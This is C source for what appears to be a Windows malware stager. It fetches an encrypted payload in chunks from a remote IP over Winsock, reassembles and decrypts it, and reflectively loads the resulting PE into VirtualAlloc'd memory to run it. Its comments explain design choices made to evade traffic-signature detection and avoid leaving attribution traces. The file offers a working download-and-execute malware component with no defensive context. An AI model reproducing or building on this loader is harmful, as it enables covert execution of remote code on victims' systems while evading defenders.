/*
 * agent_windows/src/drop_stager_win.c
 *
 * Windows 侧 stager 实现：Winsock 逐块拉取 -> 组装 -> seal -> 解包
 * -> VirtualAlloc -> 反射装载执行 -> 明文擦除。
 *
 * 分工与硬规则见 include/drop_stager_win.h。
 *
 * 两个平台差异决定了这份代码不可能与 Linux stager 共用主体：
 *   1. 取块用 Winsock（socket/connect/send/recv/closesocket），不用 POSIX
 *      read/write，也不用 getaddrinfo —— 后者在静态 glibc 下会经 NSS 引入
 *      dlopen 系列符号与 /etc/passwd 查询，把归因特征带回落地端。
 *   2. 落地执行是反射装载，不是 execveat。装载后控制回到 stager，因此
 *      明文擦除与 region 释放是本层的责任，而不是"进程映像已消失"。
 */

#include "drop_stager_win.h"

#include "drop.h"
#include "drop_http.h"
#include "drop_pe.h"

#include <stdlib.h>
#include <string.h>

#include <winmem.h>
#include <winsock2.h>

#define WS_IOBUF (DP_CHUNK_MAX + 1024)

/* ---- Winsock 取块 ---- */

static int ws_connect(const char *ip, uint16_t port, SOCKET *out)
{
    SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (s == INVALID_SOCKET) return -1;

    SOCKADDR_IN sa;
    memset(&sa, 0, sizeof(sa));
    sa.sin_family = (unsigned short)AF_INET;
    sa.sin_port   = htons(port);
    sa.sin_addr   = inet_addr(ip);
    if (sa.sin_addr == (unsigned long)0xffffffffUL) {
        closesocket(s);
        return -1;
    }

    if (connect(s, (const SOCKADDR *)&sa, (int)sizeof(sa)) == SOCKET_ERROR) {
        closesocket(s);
        return -1;
    }
    *out = s;
    return 0;
}

/*
 * 连一次、拉一块、断一次。
 * 长连接拉全部块会让单连接字节数等于制品大小 —— 那正是分块想消除的特征。
 */
static int ws_fetch(const char *ip, uint16_t port, uint32_t idx,
                    uint8_t *resp, size_t resp_cap, size_t *rlen)
{
    SOCKET s;
    if (ws_connect(ip, port, &s) != 0) return -1;

    char req[256];
    size_t rlen_req = 0;
    if (dp_http_build_request(idx, NULL, req, sizeof(req), &rlen_req) != DP_OK) {
        closesocket(s);
        return -1;
    }

    if (send(s, req, (int)rlen_req, 0) != (int)rlen_req) {
        closesocket(s);
        return -1;
    }

    size_t off = 0;
    for (;;) {
        if (off >= resp_cap) { closesocket(s); return -1; }
        int n = recv(s, (char *)(resp + off), (int)(resp_cap - off), 0);
        if (n < 0) { closesocket(s); return -1; }
        if (n == 0) break;                 /* 对端关闭：响应收完 */
        off += (size_t)n;
    }
    closesocket(s);
    *rlen = off;
    return 0;
}

const char *wstage_errstr(int rc)
{
    switch (rc) {
    case WS_OK:          return "ok";
    case WS_ERR_ARG:     return "bad argument";
    case WS_ERR_WSA:     return "winsock init failed";
    case WS_ERR_FETCH:   return "chunk fetch failed";
    case WS_ERR_HTTP:    return "http response parse failed";
    case WS_ERR_PUT:     return "assembler rejected chunk";
    case WS_ERR_SEAL:    return "seal failed (incomplete or digest mismatch)";
    case WS_ERR_UNPACK:  return "unpack failed";
    case WS_ERR_ALLOC:   return "virtualalloc failed";
    default:             return "unknown";
    }
}

int wstage_run(const wstage_cfg_t *cfg, wstage_result_t *out)
{
    dp_manifest_t m;
    dp_asm_t      a;
    uint8_t      *resp = NULL;
    uint8_t      *plain = NULL;
    uint8_t      *region = NULL;
    size_t        plain_cap = 0;
    size_t        plain_len = 0;
    size_t        region_size = 0;
    int           rc = WS_ERR_ARG;
    /* 声明提前：C++ 不允许 goto 跨越初始化，而失败路径统一 goto done */
    dp_pe_result_t pr;
    int            rrc = DP_ERR_ARG;

    /* 先清零：失败路径统一走到 done 里的 dp_asm_free，未初始化的 a 不能进那里 */
    memset(&a, 0, sizeof(a));
    memset(&m, 0, sizeof(m));
    memset(&pr, 0, sizeof(pr));

    if (out) memset(out, 0, sizeof(*out));
    if (!cfg || !cfg->manifest || !cfg->seed || cfg->seed_len == 0) return WS_ERR_ARG;
    if (!cfg->ip || cfg->port == 0 || !cfg->rh) return WS_ERR_ARG;
    if (!cfg->rh->protect || !cfg->rh->call || !cfg->rh->resolve) return WS_ERR_ARG;

    WSADATA wd;
    if (WSAStartup(MAKEWORD(2, 2), &wd) != 0) return WS_ERR_WSA;

    memcpy(&m, cfg->manifest, sizeof(m));
    if (dp_manifest_check(&m) != DP_OK) { rc = WS_ERR_ARG; goto done; }
    if (dp_asm_init(&a, &m) != DP_OK) { rc = WS_ERR_ARG; goto done; }

    resp = (uint8_t *)malloc(WS_IOBUF);
    if (!resp) { rc = WS_ERR_ALLOC; goto done; }

    /* ---- 逐块拉取 ---- */
    for (uint32_t i = 0; i < m.nchunks; i++) {
        size_t rlen = 0;
        if (ws_fetch(cfg->ip, cfg->port, i, resp, WS_IOBUF, &rlen) != 0) {
            rc = WS_ERR_FETCH;
            goto done;
        }
        const uint8_t *body = NULL;
        size_t blen = 0;
        if (dp_http_parse_response(resp, rlen, &body, &blen) != DP_OK) {
            rc = WS_ERR_HTTP;
            goto done;
        }
        int pr = dp_asm_put(&a, i, body, blen);
        if (pr != DP_OK && pr != DP_ERR_DUP) {
            rc = WS_ERR_PUT;
            goto done;
        }
        if (out) {
            out->chunks_fetched++;
            if (pr == DP_ERR_DUP) out->dup_count++;
        }
    }

    if (dp_asm_seal(&a) != DP_OK) { rc = WS_ERR_SEAL; goto done; }
    if (out) {
        out->sealed_len = a.len;
        out->dup_count  = a.dup_count;
        out->bad_count  = a.bad_count;
    }

    /* ---- 解包。容量不足时 dp_asm_unpack_pe 回报所需大小，重新分配再试 ---- */
    plain_cap = (size_t)a.len * 2u + 65536u;
    for (int attempt = 0; attempt < 8; attempt++) {
        uint8_t *np = (uint8_t *)realloc(plain, plain_cap);
        if (!np) { rc = WS_ERR_ALLOC; goto done; }
        plain = np;

        size_t cap = plain_cap;
        dp_pe_info_t info;
        int ur = dp_asm_unpack_pe(&a, cfg->seed, cfg->seed_len,
                                  plain, &cap, &info);
        if (ur == DP_OK) {
            plain_len = info.raw_len;
            if (out) {
                out->plain_len   = info.raw_len;
                out->region_need = info.region_need;
                out->machine     = info.machine;
                out->is_dll      = info.is_dll;
            }
            region_size = info.region_need;
            break;
        }
        if (ur != DP_ERR_NOMEM) { rc = WS_ERR_UNPACK; goto done; }
        if (cap > (size_t)1 << 31) { rc = WS_ERR_ALLOC; goto done; }
        plain_cap = cap;                  /* 按回报的大小扩到刚好够 */
        if (attempt == 7) { rc = WS_ERR_UNPACK; goto done; }
    }
    if (region_size == 0) { rc = WS_ERR_UNPACK; goto done; }

    /* ---- 分配 region 并反射装载 ---- */
    region = (uint8_t *)VirtualAlloc(NULL, region_size,
                                     MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!region) { rc = WS_ERR_ALLOC; goto done; }
    if (out) out->region_size = region_size;

    rrc = dp_pe_run(plain, plain_len, region, region_size, cfg->rh, &pr);
    if (out) {
        out->entry_invoked = pr.entry_invoked;
        out->rc = rrc;
    }
    if (rrc != DP_OK) { rc = WS_ERR_UNPACK; goto done; }

    rc = WS_OK;

done:
    /* 明文擦除：反射装载会返回，明文不会随映像消失。 */
    if (plain) {
        dp_pe_scrub(plain, plain_len ? plain_len : plain_cap);
        if (out) out->scrubbed = 1;
        free(plain);
    }
    if (region) VirtualFree(region, region_size, MEM_RELEASE);
    if (resp) free(resp);
    dp_asm_free(&a);
    WSACleanup();
    return rc;
}
